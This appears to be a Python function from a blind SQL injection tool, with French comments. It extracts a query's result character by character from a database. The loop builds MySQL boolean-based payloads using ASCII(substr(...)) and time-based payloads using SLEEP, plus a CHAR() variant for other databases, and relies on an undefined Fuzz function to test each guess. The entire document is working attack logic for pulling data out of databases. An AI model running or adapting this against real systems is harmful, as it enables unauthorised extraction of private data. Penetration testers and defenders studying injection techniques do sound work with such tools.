#coding:utf-8

def GetInfo(setting, function):

	delay = setting['delay']
	escape = setting['escape']
	operator = setting['operator']
	comment = setting['comment']
	charset = setting['charset']
	sqli_type = setting['sqli_type']
	p_time = setting['p_time']
	dbms = setting['dbms']

	nextchar = 1
	valid = ''
	i = 0 

	while i<len(charset):# Tant qu'un caractère est bon
		for c in charset:
			c = ord(str(c))# Transformation d'un caractère en ASCII

			if dbms == 'MySQL':

				if sqli_type == 'BSQLI':# Création d'un payload pour SQLi Blind

					payload = '{} {} ASCII(substr(({}), {},1))={}{}'.format(escape, operator, function, nextchar, c, comment)

				else:
					payload = '{} {} (SELECT SLEEP({}) WHERE ASCII(substr(({}), {},1))={}){}'.format(escape, operator, p_time, function, nextchar, c, comment)
			else:
				payload = '{} {} substr({},{},1) = CHAR({}){}'.format(escape, operator,function, nextchar, c, comment)

			if Fuzz(setting, payload):
				i = 0# On continue la boucles
				nextchar += 1# On met +1 pour passer au caractère suivant
				valid += chr(int(c))# On decode le bon caractère et on le stock
		
			i+=1
			
	print('['+Fore.YELLOW+'+'+Fore.RESET+'] '+Fore.YELLOW+function+Fore.RESET+' : ' + valid)
